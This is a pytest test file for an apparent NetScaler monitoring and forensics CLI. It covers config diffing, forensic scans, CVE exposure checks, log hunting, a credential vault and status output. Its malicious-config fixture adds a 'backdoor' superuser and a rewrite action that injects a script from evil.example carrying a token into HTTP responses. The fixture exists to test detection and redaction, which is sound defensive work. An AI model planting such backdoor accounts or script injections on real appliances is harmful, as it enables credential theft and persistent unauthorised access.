import json
from datetime import UTC, datetime
from pathlib import Path

import pytest
import yaml
from sqlalchemy import create_engine
from typer.testing import CliRunner

from scalar.cli import main as cli
from scalar.secrets.vault import Vault, generate_key
from scalar.store.database import Database

EXAMPLE = Path(__file__).parents[2] / "deploy" / "config.example.yaml"
runner = CliRunner()


def test_appliance_network_command_requires_root(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(cli.os, "geteuid", lambda: 1000)
    result = runner.invoke(cli.app, ["device", "allow-network"])
    assert result.exit_code == 1 and "sudo" in result.output


def test_appliance_network_restart_only_touches_monitor_service(cfg_path: Path,
                                                               monkeypatch: pytest.MonkeyPatch) -> None:
    import subprocess

    from scalar import appliance

    monkeypatch.setattr(cli.os, "geteuid", lambda: 0)
    monkeypatch.setattr(appliance, "allow_appliance_network", lambda cfg: ["192.0.2.10/32"])
    commands = []
    monkeypatch.setattr(subprocess, "run", lambda command, **kwargs: commands.append(command))
    result = runner.invoke(cli.app, ["--config", str(cfg_path), "device", "allow-network", "--restart"])
    assert result.exit_code == 0, result.output
    assert commands == [["/usr/bin/systemctl", "daemon-reload"],
                        ["/usr/bin/systemctl", "restart", "scalar"]]
    assert "192.0.2.10/32" in result.output


def test_http_setup_requires_root(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(cli.os, "geteuid", lambda: 1000)
    result = runner.invoke(cli.app, ["web", "allow-http", "--host", "192.0.2.50",
                                    "--allow-network", "198.51.100.5/32"])
    assert result.exit_code == 1 and "sudo" in result.output


def test_http_setup_command_and_explicit_restart(monkeypatch: pytest.MonkeyPatch) -> None:
    import subprocess

    from scalar.web import server

    monkeypatch.setattr(cli.os, "geteuid", lambda: 0)
    calls = []

    def configure(path, host, networks, *, port=None):  # type: ignore[no-untyped-def]
        calls.append((host, networks, port))
        return f"http://{host}:8080"

    monkeypatch.setattr(server, "configure_http", configure)
    commands = []
    monkeypatch.setattr(subprocess, "run", lambda command, **kwargs: commands.append(command))
    result = runner.invoke(cli.app, ["web", "allow-http", "--host", "192.0.2.50",
                                    "--allow-network", "198.51.100.5/32", "--restart"])
    assert result.exit_code == 0, result.output
    assert calls == [("192.0.2.50", ["198.51.100.5/32"], None)]
    assert commands == [["/usr/bin/systemctl", "daemon-reload"],
                        ["/usr/bin/systemctl", "restart", "scalar", "scalar-web"]]
    assert "without encryption" in result.output


@pytest.fixture
def cfg_path(tmp_path: Path) -> Path:
    doc = yaml.safe_load(EXAMPLE.read_text())
    doc["paths"] = {"vault": str(tmp_path / "vault"),
                    "sealed_vault_key": str(tmp_path / "vault-key.cred")}
    p = tmp_path / "config.yaml"
    p.write_text(yaml.safe_dump(doc))
    return p


@pytest.fixture
def key(cfg_path: Path, monkeypatch: pytest.MonkeyPatch) -> bytes:
    k = generate_key()
    Vault.create(cfg_path.parent / "vault", k)
    monkeypatch.setitem(cli._state, "key_loader", lambda: k)
    return k


def test_config_validate(cfg_path: Path) -> None:
    r = runner.invoke(cli.app, ["--config", str(cfg_path), "config", "validate"])
    assert r.exit_code == 0, r.output
    assert "2 device(s)" in r.output


def test_config_diff_offline(tmp_path: Path) -> None:
    old = tmp_path / "old.conf"
    new = tmp_path / "new.conf"
    old.write_text("set ns hostName a\n")
    new.write_text("set ns hostName a\nadd system user evil abcdef0123456789abcd -encrypted\n")
    r = runner.invoke(cli.app, ["config", "diff", str(old), str(new)])
    assert r.exit_code == 0, r.output
    assert "critical" in r.output
    assert "abcdef0123456789abcd" not in r.output


def test_config_forensic_safe(tmp_path: Path) -> None:
    path = tmp_path / "safe.conf"
    path.write_text(
        "set ns hostName ns-gw-01\n"
        "set ns ip 10.0.0.10 -mgmtAccess ENABLED -ssh ENABLED -gui ENABLED -telnet DISABLED\n"
        "add system user sc_nitro 0123456789abcdef0123456789abcdef -encrypted -hashmethod SHA512\n"
    )
    result = runner.invoke(cli.app, ["config", "forensic", str(path)])
    assert result.exit_code == 0, result.output
    assert "Changed management users: none" in result.output
    assert "No forensic findings" in result.output


def test_config_forensic_malicious(tmp_path: Path) -> None:
    path = tmp_path / "malicious.conf"
    payload = (
        "set ns hostName ns-gw-01\n"
        "add system user backdoor abcdefabcdefabcdefabcdefabcdefab -encrypted -hashmethod SHA512\n"
        "bind system user backdoor superuser 0\n"
        "add rewrite action credential_capture insert_before \"HTTP.RES.BODY(1000)\" q{\"<script src=https://evil.example/a.js?token=secret></script>\"}\n"
    )
    path.write_text(payload)
    result = runner.invoke(cli.app, ["config", "forensic", str(path), "--json"])
    assert result.exit_code == 0, result.output
    data = json.loads(result.output)
    assert data["summary"]["critical_findings"] >= 1
    assert "security-feature-disabled" not in str(data)
    output = runner.invoke(cli.app, ["config", "forensic", str(path)]).output
    assert "CRITICAL findings:" in output
    assert "backdoor" in output
    assert "token=secret" not in output
    assert "<redacted>" in output or "redacted" in output.lower()


def test_config_forensic_compare_previous(tmp_path: Path) -> None:
    previous = tmp_path / "previous.conf"
    current = tmp_path / "current.conf"
    previous.write_text(
        "set ns hostName ns-gw-01\n"
        "add system user old_admin aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa -encrypted\n"
        "add authentication samlAction corp_saml -samlIdPCertName corp_idp -samlSigningCertName corp_sp\n"
    )
    current.write_text(
        "set ns hostName ns-gw-01\n"
        "add system user new_admin cccccccccccccccccccccccccccccccc -encrypted\n"
        "add authentication samlAction corp_saml -samlIdPCertName new_idp -samlSigningCertName corp_sp\n"
    )
    result = runner.invoke(
        cli.app,
        ["config", "forensic", str(current), "--previous", str(previous), "--json"],
    )
    assert result.exit_code == 0, result.output
    data = json.loads(result.output)
    assert data["summary"]["changed_management_users"] >= 1
    assert data["summary"]["exceptional_delta_count"] >= 1
    assert any(item["change"] == "added" for item in data["summary"]["changed_management_user_summary"])
    assert any(item["kind"] == "modified" for item in data["summary"]["exceptional_delta_summary"])


def test_cred_set_list_rm(cfg_path: Path, key: bytes) -> None:
    base = ["--config", str(cfg_path)]
    r = runner.invoke(cli.app, [*base, "cred", "set", "sc_nitro", "--stdin"],
                      input="hunter2-secret\n")
    assert r.exit_code == 0, r.output
    assert "ns-gw-01" in r.output
    r = runner.invoke(cli.app, [*base, "cred", "list"])
    assert "sc_nitro" in r.output and "hunter2" not in r.output
    assert Vault.open(cfg_path.parent / "vault", key).get("sc_nitro").reveal_password() \
        == "hunter2-secret"
    r = runner.invoke(cli.app, [*base, "cred", "rm", "sc_nitro"])
    assert r.exit_code == 1 and "--yes" in r.output
    r = runner.invoke(cli.app, [*base, "cred", "rm", "sc_nitro", "--yes"])
    assert r.exit_code == 0


def test_cred_set_rejects_bad_name(cfg_path: Path, key: bytes) -> None:
    r = runner.invoke(cli.app, ["--config", str(cfg_path), "cred", "set", "bad name", "--stdin"],
                      input="x\n")
    assert r.exit_code == 1


def test_exposure_offline_exit_code() -> None:
    r = runner.invoke(cli.app, ["exposure", "--version-string",
                                "NetScaler NS14.1: Build 43.50.nc"])
    assert r.exit_code == 2
    assert "CVE-2025-5777" in r.output
    r = runner.invoke(cli.app, ["exposure", "--version-string",
                                "NetScaler NS14.1: Build 73.46.nc"])
    assert r.exit_code == 0, r.output
    assert "minimum safe build on 14.1: 73.46" in r.output


def test_exposure_exits_2_when_exploited_exposure_is_unknown() -> None:
    # A train missing from the advisory data has no VULNERABLE result, but is no all-clear.
    r = runner.invoke(cli.app, ["exposure", "--version-string",
                                "NetScaler NS15.1: Build 10.1.nc", "--json"])
    assert r.exit_code == 2, r.output
    [doc] = json.loads(r.output)
    assert doc["worst"] == "unknown" and "CVE-2023-4966" in doc["needs_attention"]
    assert doc["data_version"] and doc["min_safe_build"] is None
    bleed = next(item for item in doc["results"] if item["cve"] == "CVE-2023-4966")
    assert bleed["bulletin"] and bleed["exploited"] is True and bleed["verified"] is True
    assert bleed["post_patch_actions"]
    text = runner.invoke(cli.app, ["exposure", "--version-string",
                                   "NetScaler NS15.1: Build 10.1.nc"])
    assert text.exit_code == 2 and "cannot determine exposure" in text.output


def test_hunt_over_log_file(tmp_path: Path) -> None:
    log = tmp_path / "ns.log"
    prefix = ("Oct  5 10:00:01 <local0.info> 10.0.0.10 2026/10/05:10:00:01 GMT ns-gw-01 "
              "0-PPE-0 : default ")
    lines = [
        prefix + 'GUI CMD_EXECUTED 1 0 : User admin1 - Remote_ip 198.51.100.7 - '
                 'Command "add system user backdoor ****" - Status "Success"',
        prefix + 'AAA Message 2 0 : "Authentication is rejected for \x89\x01\xfe"',
        prefix + "SSLVPN LOGIN 3 0 : Context j@192.0.2.10 - SessionId: 5- User j - "
                 "Client_ip 192.0.2.10",
    ]
    log.write_bytes("\n".join(lines).encode("latin-1"))
    r = runner.invoke(cli.app, ["hunt", str(log), "--device", "ns-gw-01",
                                "--admin-networks", "10.0.0.0/8"])
    assert r.exit_code == 0, r.output
    assert "mgmt-high-risk-command" in r.output
    assert "mgmt-from-unexpected-ip" in r.output
    assert "cve-2025-5777-garbage-username" in r.output
    assert "mgmt-unknown-admin-user" in r.output  # skipped notice (no --admin-users)


def test_snippets(cfg_path: Path) -> None:
    r = runner.invoke(cli.app, ["--config", str(cfg_path), "snippets", "ns-gw-01",
                                "--server-ip", "10.0.0.50"])
    assert r.exit_code == 0, r.output
    assert "add system cmdPolicy scalar_ro ALLOW" in r.output
    assert "add audit syslogAction sc_syslog 10.0.0.50" in r.output
    assert "PRIMARY only" in r.output
    r = runner.invoke(cli.app, ["--config", str(cfg_path), "snippets", "nope",
                                "--server-ip", "10.0.0.50"])
    assert r.exit_code == 1 and "no device named" in r.output


def test_rules_list() -> None:
    r = runner.invoke(cli.app, ["rules", "list"])
    assert r.exit_code == 0 and "cve-2025-5777-garbage-username" in r.output


def test_database_init_and_notification_queue(cfg_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    engine = create_engine(f"sqlite:///{cfg_path.parent / 'index.db'}")
    monkeypatch.setattr(cli, "_database", lambda cfg: Database(engine))
    base = ["--config", str(cfg_path)]
    result = runner.invoke(cli.app, [*base, "db", "init"])
    assert result.exit_code == 0, result.output
    result = runner.invoke(cli.app, [*base, "notify", "test"])
    assert result.exit_code == 0, result.output
    assert Database(engine).counts()["pending_notifications"] == 3
    result = runner.invoke(cli.app, [*base, "findings", "--json"])
    assert result.exit_code == 0
    assert json.loads(result.output)[0]["rule_id"] == "notification-test"


def test_status_reports_stale_daemon(cfg_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    document = yaml.safe_load(cfg_path.read_text())
    document["paths"]["state_dir"] = str(cfg_path.parent)
    cfg_path.write_text(yaml.safe_dump(document))
    database = Database(create_engine(f"sqlite:///{cfg_path.parent / 'index.db'}"))
    database.initialize()
    monkeypatch.setattr(cli, "_database", lambda cfg: database)
    (cfg_path.parent / "status.json").write_text(json.dumps({
        "state": "healthy", "updated_at": "2020-01-01T00:00:00+00:00", "devices": {}}))
    result = runner.invoke(cli.app, ["--config", str(cfg_path), "status", "--json"])
    assert result.exit_code == 1
    assert json.loads(result.output)["state"] == "stale"


def test_status_text_shows_missing_log_sources_and_exposure(cfg_path: Path,
                                                           monkeypatch: pytest.MonkeyPatch) -> None:
    document = yaml.safe_load(cfg_path.read_text())
    document["paths"]["state_dir"] = str(cfg_path.parent)
    cfg_path.write_text(yaml.safe_dump(document))
    database = Database(create_engine(f"sqlite:///{cfg_path.parent / 'index.db'}"))
    database.initialize()
    monkeypatch.setattr(cli, "_database", lambda cfg: database)
    (cfg_path.parent / "status.json").write_text(json.dumps({
        "state": "healthy", "updated_at": datetime.now(UTC).isoformat(), "warnings": [],
        "devices": {"ns-gw-01": {
            "nitro": {"last_ok": "2026-10-13T10:00:00+00:00", "failures": 0},
            "syslog": {"last_received": None, "lines": 0,
                       "missing_sources": ["shell (bash.log/sh.log)"]},
            "exposure": {"posture": {"worst": "unknown", "version": "NS14.1 73.46 (fips)",
                                     "lifecycle": "supported",
                                     "needs_attention": ["CVE-2025-5777"]}}}}}))
    result = runner.invoke(cli.app, ["--config", str(cfg_path), "status"])
    assert result.exit_code == 0, result.output
    assert "log sources never received: shell (bash.log/sh.log)" in result.output
    assert "exposure: unknown" in result.output and "CVE-2025-5777" in result.output


def test_archive_cli_search_and_verify(cfg_path: Path) -> None:
    from scalar.store.archive import RawArchive

    document = yaml.safe_load(cfg_path.read_text())
    document["paths"]["state_dir"] = str(cfg_path.parent)
    cfg_path.write_text(yaml.safe_dump(document))
    archive = RawArchive(cfg_path.parent / "archive")
    reference = archive.put("ns-gw-01", b"suspicious command\nnormal line\n", datetime.now(UTC))
    base = ["--config", str(cfg_path)]
    result = runner.invoke(cli.app, [*base, "search", "suspicious", "ns-gw-01"])
    assert result.exit_code == 0, result.output
    assert json.loads(result.output)["raw_ref"] == reference.locator
    result = runner.invoke(cli.app, [*base, "archive", "verify", "ns-gw-01"])
    assert result.exit_code == 0, result.output
    assert "Verified 1" in result.output


def test_web_account_creation_prompts_and_stores_only_hash(cfg_path: Path,
                                                          monkeypatch: pytest.MonkeyPatch) -> None:
    from scalar.web.auth import AuthStore

    document = yaml.safe_load(cfg_path.read_text())
    document["paths"]["state_dir"] = str(cfg_path.parent)
    cfg_path.write_text(yaml.safe_dump(document))
    password = "ui-test-only-long-password"
    monkeypatch.setattr(cli, "_prompt_secret", lambda prompt: password)
    monkeypatch.setattr(cli, "_chown_service", lambda path, user: None)
    result = runner.invoke(cli.app, ["--config", str(cfg_path), "web", "user-set", "admin"])
    assert result.exit_code == 0, result.output
    path = cfg_path.parent / "web-users.json"
    assert password not in path.read_text() and password not in result.output
    assert AuthStore(path).login("admin", password, "127.0.0.1")[1].username == "admin"
